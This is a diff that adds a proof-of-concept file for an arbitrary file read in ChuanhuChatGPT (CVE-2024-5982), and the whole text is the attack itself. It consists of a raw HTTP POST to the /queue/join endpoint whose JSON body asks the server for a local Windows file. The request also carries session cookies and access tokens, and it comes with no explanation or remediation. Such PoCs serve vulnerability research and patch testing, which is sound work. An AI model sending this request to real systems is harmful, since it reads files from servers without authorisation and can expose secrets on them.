@@ -1,0 +1,19 @@
+# ChuanhuChatGPT任意文件读取(CVE-2024-5982)
+POST /queue/join? HTTP/1.1
+Host: www.xwd_test.com
+Origin: http://127.0.0.1:7860
+Sec-Fetch-Site: same-origin
+sec-ch-ua-mobile: ?0
+Accept-Encoding: gzip, deflate, br, zstd
+sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Cookie: access-token-S2KXOefTinJ5Rn-bawgKNpccszXHealu5SB5fQTn9pY=eZkp3Ybt8deKKYVTXx30Mg; access-token-unsecure-S2KXOefTinJ5Rn-bawgKNpccszXHealu5SB5fQTn9pY=eZkp3Ybt8deKKYVTXx30Mg; _ga=GA1.1.924377470.1715048235; _gid=GA1.1.1513244573.1715048235; _ga_R1FN4KJKJH=GS1.1.1715048235.1.1.1715048273.0.0.0
+sec-ch-ua-platform: "Windows"
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept: */*
+Content-Type: application/json
+Content-Length: 116
+
+{"data":["C://Windows/DTCINSTALL.log"],"event_data":"666","fn_index":42,"session_hash":"8215bqt096","trigger_id":22}
